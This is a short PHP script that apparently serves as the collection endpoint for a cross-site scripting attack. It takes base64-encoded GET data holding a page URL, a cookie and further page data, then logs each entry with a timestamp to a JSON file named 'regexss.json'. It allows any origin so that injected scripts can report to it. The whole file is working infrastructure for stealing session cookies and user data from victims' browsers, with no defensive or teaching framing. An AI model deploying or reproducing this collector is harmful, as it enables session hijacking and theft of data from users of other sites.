<?php

header("X-Frame-Options: sameorigin");
header("Access-Control-Allow-Origin: *");

date_default_timezone_set("Asia/Kathmandu");

$datajson = 'include/regexss.json';
$data = $divider = "";

if($_SERVER["REQUEST_METHOD"] == "GET"){
	$data = verify($_GET["data"]);
}

function verify($data){
	$data = urldecode($data);
	$data = base64_decode($data);
	$data = trim($data);
	$data = stripslashes($data);
	$data = htmlspecialchars($data);
	$data = htmlentities($data);
	return $data;
}

$divider = explode("|", $data);

if(empty($divider[0])){
	$divider[0] = "URL Not Found !!!";
}else if(empty($divider[1])){
	$divider[1] = "Cookie Not Found !!!";
}else if(empty($divider[2])){
	$divider[2] = "Data Not Found !!!";
}else{
	if(file_exists($datajson)){
		$current_data = file_get_contents($datajson);
		$array_data = json_decode($current_data, true);
		$form_data = array(
			'date' => date("d/m/Y H:i:s"),
			'execURL' => $divider[0],
			'cookie' => $divider[1],
			'data' => $divider[2]
		);

		$array_data[] = $form_data;
		$data_proccesed = json_encode($array_data, JSON_PRETTY_PRINT);
		file_put_contents($datajson, $data_proccesed);
		echo "Successful !!!";
	}else{
		echo "Something Went Wrong !!!";
	}
}
?>